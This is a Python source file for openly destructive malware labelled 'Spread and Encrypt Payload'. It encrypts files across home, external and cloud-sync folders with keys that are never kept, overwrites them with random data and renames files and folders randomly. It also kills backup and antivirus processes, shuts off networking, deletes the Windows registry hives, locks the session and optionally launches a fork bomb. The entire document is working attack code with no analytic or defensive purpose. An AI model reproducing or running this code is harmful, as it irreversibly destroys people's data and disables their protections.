# MINC - Spread and Encrypt Payload (DESTRUCTIVE + CLOUDFORCE + OBFUSCATION)

import os
import threading
import shutil
import random
import string
import time
from pathlib import Path
from cryptography.fernet import Fernet

TARGET_PATHS = [
    os.path.expanduser("~"),
    "/mnt",                   # Linux
    "C:\\Users\\",            # Windows
    "D:\\", "E:\\",           # External
    "/Volumes",               # macOS
]

CLOUD_DIRS = ["OneDrive", "Google Drive", "Dropbox", "iCloud", "Box", "Mega"]
SHRED_FILL = ''.join(random.choices(string.printable, k=4096)).encode()
ENCRYPTION_KEYS = []
KILL_TARGETS = ["Dropbox.exe", "OneDrive.exe", "GoogleDriveFS.exe", "backup", "antivirus", "defender"]

def generate_key():
    key = Fernet.generate_key()
    ENCRYPTION_KEYS.append(key)
    return Fernet(key)

def encrypt_file(path):
    try:
        f = generate_key()
        with open(path, "rb") as infile:
            data = infile.read()
        encrypted = f.encrypt(data)
        with open(path, "wb") as outfile:
            outfile.write(encrypted)
    except:
        pass

def shred_file(path):
    try:
        with open(path, "wb") as f:
            for _ in range(3):
                f.write(os.urandom(4096))
    except:
        pass

def hallucinate_storage(path):
    try:
        for _ in range(3):
            fake = os.path.join(path, "ghost_" + ''.join(random.choices(string.ascii_letters, k=8)) + ".dat")
            with open(fake, "wb") as f:
                f.write(SHRED_FILL * 64)
    except:
        pass

def obfuscate_directory(root):
    try:
        for dirpath, dirnames, filenames in os.walk(root):
            for name in dirnames:
                rand = ''.join(random.choices(string.ascii_letters + string.digits, k=8))
                old = os.path.join(dirpath, name)
                new = os.path.join(dirpath, f"~$sys_{rand}")
                os.rename(old, new)
            for f in filenames:
                full_path = os.path.join(dirpath, f)
                new_name = ''.join(random.choices(string.ascii_letters, k=10))
                try:
                    os.rename(full_path, os.path.join(dirpath, f"{new_name}.bak"))
                except:
                    continue
    except:
        pass

def disable_network():
    os.system("ip link set down eth0 2>/dev/null || netsh interface set interface name=\"Ethernet\" admin=disable")

def shred_registry():
    os.system("reg delete HKCU /f")
    os.system("reg delete HKLM /f")

def lock_system():
    if os.name == "nt":
        os.system("rundll32.exe user32.dll, LockWorkStation")
    else:
        os.system("loginctl lock-session")

def memory_flood():
    try:
        fill = []
        for _ in range(1024 * 25):
            fill.append(os.urandom(1024))
    except:
        pass

def kill_processes():
    for name in KILL_TARGETS:
        if os.name == "nt":
            os.system(f"taskkill /f /im {name} >nul 2>&1")
        else:
            os.system(f"pkill -f {name} >/dev/null 2>&1")

def destroy(path):
    try:
        for root, dirs, files in os.walk(path, topdown=False):
            for f in files:
                full = os.path.join(root, f)
                encrypt_file(full)
                shred_file(full)
            hallucinate_storage(root)
            obfuscate_directory(root)
    except:
        pass

def thread_target(path):
    try:
        destroy(path)
    except:
        pass

def locate_cloud_dirs():
    hits = []
    home = os.path.expanduser("~")
    for root, dirs, _ in os.walk(home):
        for d in dirs:
            for cloud in CLOUD_DIRS:
                if cloud.lower() in d.lower():
                    full = os.path.join(root, d)
                    if full not in hits:
                        hits.append(full)
    return hits

def main(detonate=False):
    threads = []
    cloud_hits = locate_cloud_dirs()

    for base in TARGET_PATHS + cloud_hits:
        if os.path.exists(base):
            t = threading.Thread(target=thread_target, args=(base,))
            t.start()
            threads.append(t)

    kill_processes()
    memory_flood()
    disable_network()
    lock_system()
    if os.name == "nt":
        shred_registry()

    for t in threads:
        t.join()

    if detonate:
        while True:
            os.fork()  # forkbomb if allowed
            time.sleep(0.1)

if __name__ == "__main__":
    DET = "--det" in sys.argv or "-d" in sys.argv
    main(detonate=DET)

